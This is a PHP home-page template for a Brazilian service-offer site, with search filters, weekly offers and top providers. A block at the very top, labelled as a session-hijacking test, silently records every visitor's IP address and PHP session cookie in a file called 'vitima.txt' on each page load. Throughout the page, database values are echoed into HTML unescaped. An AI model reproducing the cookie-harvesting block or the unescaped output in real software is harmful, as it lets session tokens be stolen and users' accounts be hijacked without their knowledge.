<?php

include_once("cabecalho-principal.php");
include_once("../controller/config.php");
$config = new config();

//------------- teste para hijacking session---------------
$ip = get_client_ip();
if(isset($_COOKIE['PHPSESSID']))
{
    $id = $_COOKIE['PHPSESSID'];
    $salvar = "Ip vitima= ".$ip." - cook PHP = ".$id. "\r\n";
    $fp = fopen("vitima.txt", "a+",0);
    $escreve = fwrite($fp, $salvar,strlen($salvar));
    fclose($fp);    
}


function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

//----------------------------------------------------------
?>



<section class="main-slider">
  <div id="myCarousel" class="carousel slide carousel-fade" data-ride="carousel">
    <div class="carousel-inner">
      <div class="item active">
        <img id="img1" src="" alt="">
        <img id="escrito1" src="" alt="">
      </div>

      <div class="item">
        <img id="img2" src="" alt="">
        <img id="escrito2" src="" alt="">
      </div> 
    </div>
  </div>
</section>
    
<div class="panel panel-default painel">
    <div class="panel-body painel-pesquisa">
        <form method="post" action="busca">
            <div class="form-group pesquisa container">
                <div class="row">
                    <div class="col-md-6 col-md-offset-1 col-sm-6 col-xs-12">
                        <label id="lbPesquisa" for="exampleInputEmail1">PALAVRA DA PESQUISA</label>
                        <input type="text" name="palavra"class="form-control" id="InputPalavra" placeholder="Pesquisa">
                    </div>

                    <div class="col-sm-2 col-md-1 col-xs-4 btAvancado">
                        <button class="btn btn-default btn-lg" type="button" data-toggle="collapse" data-target="#collapseExample" aria-expanded="false" aria-controls="collapseExample">
                            Filtrar
                        </button>
                     </div>
        

                    <div class="col-sm-2 col-md-2 col-xs-8 btPesquisa">
                        <button type="submit" class="btn btn-default btn-lg btPesquisar">
                        <span class="glyphicon glyphicon-search" aria-hidden="true"></span> Pesquisar
                        </button>
                    </div>
                </div>
            </div>
       
        <div class="collapse" id="collapseExample">
          <div class="well">
            <div class="row filtros-index">
                <div class="col-sm-12 col-md-3 col-md-offset-1 categoria">
                    <label for="exampleInputEmail1">CATEGORIA</label>
                    <select id="cbCategoria" name="categoria" class="selectpicker cbCategoria" data-live-search="true" data-widt="50px" title="ESCOLHA">  
                    </select>
                </div>

                <div class="col-sm-12 col-md-3   SelEstado">
                    <label for="exampleInputEmail1">ESTADO</label>
                    <select id="cbEstado" name="estado" class="selectpicker cbEstado" data-live-search="true" title="ESCOLHA" data-size="3" > 
                        <option value= "" >NENHUM</option> 
                        <option data-divider="true"></option>
                        <option value= "AC" >ACRE</option> 
                        <option value= "AL" >ALAGOAS</option> 
                        <option value= "AP" >AMAPA</option> 
                        <option value= "AM" >AMAZONAS</option>                              
                        <option value= "BA" >BAHIA</option>                               
                        <option value= "CE" >CEARA</option>                               
                        <option value= "DF" >DISTRITO FEDERAL</option>                         
                        <option value= "ES" >ESPIRITO SANTO</option>                           
                        <option value= "RR" >RORAIMA</option>                                
                        <option value= "GO" >GOIAS</option>                                
                        <option value= "MA" >MARANHAO</option>                                
                        <option value= "MT" >MATO GROSSO</option>                              
                        <option value= "MS" >MATO GROSSO DO SUL</option>                
                        <option value= "MG">MINAS GERAIS</option>                              
                        <option value= "PA" >PARA</option>                               
                        <option value= "PB" >PARAIBA</option>                              
                        <option value= "PR" >PARANA</option>                              
                        <option value= "PE" >PERNAMBUCO</option>                               
                        <option value= "PI" >PIAUI</option>                               
                        <option value= "RJ" >RIO DE JANEIRO</option>                           
                        <option value= "RN" >RIO GRANDE DO NORTE</option>                      
                        <option value= "RS" >RIO GRANDE DO SUL</option>                        
                        <option value= "RO" >RONDONIA</option>                               
                        <option value= "TO" >TOCANTINS</option>                                
                        <option value= "SC" >SANTA CATARINA</option>                           
                        <option value= "SP" >SAO PAULO</option>                               
                        <option value= "SE" >SERGIPE</option>                          
                    </select>
                </div>

                <div class="col-sm-12 col-md-3  SelCidade">
                    <label for="exampleInputEmail1">CIDADE</label>
                    <select id="cbCidade" name="cidade" class="selectpicker cbCidade"  data-live-search="true" data-size="3" title="ESCOLHA">           
                    </select>
                </div>
              </div>
            </div>
        </div>

      </form>
     </div> 
</div>


<section id="ofertas">
    <h1 class="tituloSessoes"><span class="glyphicon glyphicon-fire" aria-hidden="true"></span> OFERTAS<small> Da Semana</small>
    </h1>

    <div class="container">
       <?php
        include_once("../model/dao.php");
        include_once("../controller/controller.oferta.php");
        include_once("../controller/controller.servico.php");
        include_once("../controller/controller.prestador.php");
        include_once("../controller/controller.ofertaSemana.php");

        $obj_ofertaSemana = new OfertaSemanaController();
        $retorno_OfertaSemana= $obj_ofertaSemana->buscaIniFim();
        if($retorno_OfertaSemana)
        {
            foreach ($retorno_OfertaSemana as $dados) {
                $idIni = $dados->posIni;
            }
        }
        

        $obj_ofertaSemana->setIdOferta($idIni);
        $obj_ofertaSemana->setQtRegistros($config->getQtRegistros());
        $retornoBusca = $obj_ofertaSemana->buscaOferta();
        if(sizeof($retornoBusca)< $config->getQtRegistros())
        {
             $obj_ofertaSemana->setIdOferta(0);
             $obj_ofertaSemana->setQtRegistros($config->getQtRegistros()-sizeof($retornoBusca));

              $retornoBuscaContinuacao =  $obj_ofertaSemana->buscaOferta();
              if ($retornoBuscaContinuacao) {
                  $retornoBusca=array_merge($retornoBusca,$retornoBuscaContinuacao);
              }
        }
        if($retornoBusca) 
        {
            foreach($retornoBusca as $dados) 
            {    
                $idOferta = $dados->idOferta;
                $titulo = $dados->titulo;
                $imagem =$dados->imagem;
                $obj_serv = new ServicoController();             
                $obj_serv->setId_servico($dados->idServico);
                $retorno = $obj_serv->pesquisaId();
                if($retorno) 
                {
                    foreach($retorno as $dados) 
                    { 
                        $obj_Prestador = new PrestadorController();
                        $obj_Prestador->setId_prestador($dados->idPrestador);
                        $retorno = $obj_Prestador->busca();
                        if($retorno) 
                        {
                            foreach($retorno as $dados) 
                            {
                                $Nomeprestador = $dados->nomeFantasia;
                            }
                        }
                    }
                }
        ?>
        
        
        <div class="col-xd-12 col-sm-6 col-md-3 ">
            <div class="thumbnail">
              <?php  echo "<img class='img-corte'  src='$imagem' \>"; ?>
                <div class="caption">
                    <h5 id="caption-prestador-oferta"><?php echo $Nomeprestador; ?></h5>
                    <h4 id="caption-box"><b><?php echo $titulo; ?></b></h4>
                    <div>
                        <div class="row thumbnail-botoes">
                            <div class="col-md-7 col-sm-7 col-xs-7 bts">
                    <p ><a href="/procureaqui/exibir/oferta/<?php echo $idOferta; ?>" class="btn btn-primary bt-verOferta" role="button">Ver Oferta</a></div>
                        <div class="col-md-3 col-sm-3 col-xs-3 bts">
                    <button  class="addFav btn btn-default active bt-addfavorito"  role="button" 
                    <?php 
                    $favOn = "";
                   
                        if($logado)
                        {
                            echo 'id="oferta-'.$idUsuario."-".$idOferta.'"';
                            echo "data-toggle='popover-logado-$idOferta' data-container='body' data-placement='bottom'  data-trigger='focus' data-content='salvo!!'";
                            //verifica aqui favorito 
                            include_once("../controller/controller.favorito.php");
                            $obj_fav  = new FavoritoController();
                            $obj_fav->setId_pessoa($idUsuario);
                            $retornoFav = $obj_fav->pesquisa();

                            if($retornoFav)
                            {
                                foreach ($retornoFav as $dados) {
                                    if($dados->idServOferta == $idOferta)
                                    {
                                        $favOn = "star-fav";
                                    }
                                }
                            }
                            
                        }
                        else
                        {
                            echo " data-toggle='popover' data-container='body' data-placement='bottom' data-trigger='focus' title='Atenção' data-content='É necessario estar logado para adicionar aos favoritos!!'";
                        }
                    ?> ><span class="glyphicon glyphicon-star <?php echo $favOn; ?> " aria-hidden="true"></span></button>
                </div>
                </div>
                </div>
</p>
                </div>
            </div>
        </div>
        <?php
              }
        }
        ?>   
    </div><!-- fecha o container -->  
</section>


<section id="topPrestadores">
    <h1 class="tituloSessoes"><span class="glyphicon glyphicon-tower" aria-hidden="true"></span> TOP<small>PRESTADORES</small></h1>


    <div class="container">
       <?php
       // include_once("../model/dao.php");        
        include_once("../controller/controller.prestador.php");
        
        $obj_Prestador = new PrestadorController();
        
        $retorno = $obj_Prestador->top6();
        if($retorno) 
        {
            foreach($retorno as $dados) 
            {
                $Nomeprestador = utf8_encode($dados->nomeFantasia);
                $imagem = $dados->imagem; 
                $idPrestador=$dados->idPrestador; 
        ?>
        
        <div class="col-xd-12 col-sm-3  col-md-2 ">
            <div class="thumbnail thumbnail-prestadores">


          <?php  echo "<img class='img-corte'  src='$imagem' \>"; ?>
                <div class="caption">
                    <h5 id="caption-prestador"><?php echo $Nomeprestador; ?></h5>
                    <div class="row">
                      <div class="col-md-12">
                    <p><a href="/procureaqui/exibir/prestador/<?php echo $idPrestador; ?>" class="btn btn-primary bt-verPrestador" role="button">Sobre</a>
                    </p>
                    </div>
                    </div>
                </div>
            </div>
        </div>
        <?php
              }
        }
        ?>   
    </div>
   
</section>


   


    <div class="retorno">
      <a class="irTopo" href="#"><span class="glyphicon glyphicon-triangle-top" aria-hidden="true"></span>
            <h5>SUBIR</h5></a>
    </div>
    
    
    <script src="/procureaqui/view/frameworks/bootstrap/js/jquery.min.js"></script>
    <script src="/procureaqui/view/frameworks/bootstrap/js/bootstrap.min.js"></script>
    <script src="/procureaqui/view/frameworks/bootstrap-select/js/bootstrap-select.min.js"></script>
    <script src="/procureaqui/view/frameworks/sweetalert-master/dist/sweetalert.min.js"></script>
    <script src="/procureaqui/view/js/scripts.js"></script>
    <script src="/procureaqui/view/js/scriptExibir.js"></script>

    <?php
        include_once("rodape-principal.php");
    ?>

